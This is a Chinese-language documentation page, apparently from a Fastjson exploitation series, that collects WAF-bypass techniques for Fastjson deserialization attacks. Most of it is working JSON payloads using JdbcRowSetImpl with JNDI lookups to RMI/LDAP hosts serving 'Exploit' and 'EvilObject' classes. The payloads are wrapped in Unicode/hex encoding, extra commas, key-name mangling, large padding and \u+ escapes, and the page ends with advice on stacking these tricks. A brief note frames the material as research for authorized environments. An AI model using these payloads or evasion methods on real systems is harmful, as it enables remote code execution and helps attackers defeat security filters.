---
title: WAF 绕过技巧
description: Fastjson Payload 常见 WAF 绕过手法：编码、嵌套、冗余逗号、键名替换与字符填充
order: 5
---

# WAF 绕过技巧

本文汇总 Fastjson Payload 常见的 **WAF 绕过** 手法，供安全研究与本地复现参考。实际效果依赖目标 WAF 规则与 Fastjson 版本，需按环境验证。

相关阅读：[Fastjson 探测分析](/docs/fastjson-detect) · [≤1.2.80 利用技巧](/docs/fastjson-1.2.80) · [≤1.2.68 利用技巧](/docs/fastjson-1.2.68) · [≤1.2.47 利用技巧](/docs/fastjson-1.2.47) · [Getter 触发技巧](/docs/getter-trigger)

---

## 1. Unicode / Hex 编码

对 `@type`、类名等关键字做 `\uXXXX`（Unicode）或 `\xXX`（Hex）编码，可绕过基于明文关键字的匹配：

```json
{"\x40\u0074\u0079\u0070\u0065":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```

也可对 JNDI 等危险字符串做 URL 编码，并配合嵌套反序列化结构：

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"$%7bjndi:ldap://1.1.1.1:1389/EvilObject%7d","autoCommit": true}}
```

说明：

- `\x40` / `\u0040` → `@`
- `\u0074\u0079\u0070\u0065` → `type`
- `$%7b...%7d` → `${...}`（URL 编码）

---

## 2. 多个逗号

Fastjson 解析较宽松，字段之间插入多余逗号通常仍可被解析，而部分 WAF 的 JSON 规则会因此失效：

```json
{,,,,,,"@type":"com.sun.rowset.JdbcRowSetImpl",,,,,,"dataSourceName":"rmi://127.0.0.1:1099/Exploit",,,,,, "autoCommit":true         }
```

---

## 3. `_` 和 `-` 绕过

Fastjson 在解析 JSON 字段的 **key** 时，会将 `_` 和 `-` 替换为空。

| 版本 | 行为 |
|------|------|
| **1.2.36 之前** | `_` 与 `-` 只能单独使用 |
| **1.2.36 及之后** | 支持 `_` 与 `-` 混合使用 |

示例（把 `dataSourceName` 拆成 `d_a_t_aSourceName`）：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",'d_a_t_aSourceName':"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```

同类思路也可用于其它敏感字段名（如 `autoCommit` → `auto_Commit` / `a-utoCommit` 等），需结合目标版本试探。

---

## 4. 字符填充

与 SQL 注入场景类似，部分 WAF 会对超大包体放宽检测或直接跳过深度检查。可在无害字段中填充大量字符：

```json
{
    "@type":"org.example.User",
    "username":"1",
    "f":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..."
}
```

实践中可将某字段值扩到约 **2 万** 个字符（如 2 万个 `a`），观察 WAF 是否仍拦截。

---

## 5. Unicode 再绕过（`\u+XXXX`）

在常规 `\uXXXX` 基础上，部分场景会尝试在 `u` 与十六进制之间插入 `+`（形如 `\u+XXXX`），用于对抗只匹配标准 Unicode 转义的规则：

```json
{"\u+040\u+074\u+079\u+070\u+065":"java.lang.AutoCloseabl\u+065"}
```

说明：

- 目标是让 WAF 看不到明文 `@type` / 类名片段，同时仍被后端解析链路接受（是否生效取决于 Fastjson / 中间层对转义的处理）。
- 可与第 1 节的标准 Unicode、Hex 编码组合试探。

---

## 6. 组合建议

实际绕过常把多种手法叠用，例如：

1. `@type` / 类名做 Unicode 或 Hex 编码
2. 敏感属性名插入 `_` / `-`
3. 字段间插入多余逗号
4. 无害字段做大体积填充
5. JNDI / LDAP 地址做 URL 编码或二次编码

建议在本地或授权环境先确认 Fastjson 版本与 AutoType 策略，再逐项验证 WAF 命中点，避免一次改太多导致无法定位有效手法。
